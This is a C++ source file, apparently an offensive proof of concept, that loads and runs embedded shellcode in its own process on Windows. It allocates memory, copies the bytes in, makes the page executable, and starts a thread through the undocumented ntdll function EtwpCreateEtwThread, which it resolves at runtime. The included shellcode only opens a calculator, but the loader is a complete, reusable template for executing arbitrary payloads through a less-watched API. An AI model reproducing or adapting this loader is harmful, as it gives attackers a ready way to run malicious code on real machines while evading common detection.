/*
This program executes shellcode in the current process using the following steps
    1. Allocate memory for the shellcode with VirtualAlloc setting the page permissions to Read/Write
    2. Use the RtlCopyMemory macro to copy the shellcode to the allocated memory space
    3. Change the memory page permissions to Execute/Read with VirtualProtect
    4. Call EtwpCreateEtwThread on shellcode address
    5. Call WaitForSingleObject so the program does not end before the shellcode is executed

This program loads the DLLs and gets a handle to the used procedures itself instead of using the windows package directly.
*/

// Demonstrates using ntdll.dll!EtwpCreateThreadEtw for local shellcode execution: https://gist.github.com/TheWover/b2b2e427d3a81659942f4e8b9a978dc3

#include <cstdio>
#include <Windows.h>

typedef HANDLE(*EtwpCreateEtwThread)(LPVOID, int);

int main() {
    // Pop Calc Shellcode (x86 & x64)
    unsigned char shellcode[] = { 80,81,82,83,86,87,85,106,96,90,104,99,97,108,99,84,89,72,131,236,40,101,72,139,50,72,139,118,24,72,139,118,16,72,173,72,139,48,72,139,126,48,3,87,60,139,92,23,40,139,116,31,32,72,1,254,139,84,31,36,15,183,44,23,141,82,2,173,129,60,7,87,105,110,69,117,239,139,116,31,28,72,1,254,139,52,174,72,1,247,153,255,215,72,131,196,48,93,95,94,91,90,89,88,195 };

    EtwpCreateEtwThread etw;
    DWORD old = PAGE_READWRITE;

    HMODULE hm = LoadLibraryA("ntdll.dll");
    if (hm == NULL) {
        puts("LoadLibraryA failed");
        return -1;
    }

    etw = (EtwpCreateEtwThread)GetProcAddress(hm, "EtwpCreateEtwThread");
    if (etw == NULL) {
        puts("GetProcAddress failed");
        return -1;
    }

    LPVOID dest = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (dest == NULL) {
        puts("VirtualAlloc failed");
        return -1;
    }

    RtlCopyMemory(dest, shellcode, sizeof(shellcode));

    BOOL res = VirtualProtect(dest, sizeof(shellcode), PAGE_EXECUTE, &old);
    if (res == FALSE) {
        puts("VirtualProtect failed");
        return -1;
    }

    HANDLE thread = etw(dest, 0);
    WaitForSingleObject(thread, WAIT_FAILED);

    

	return 0;
}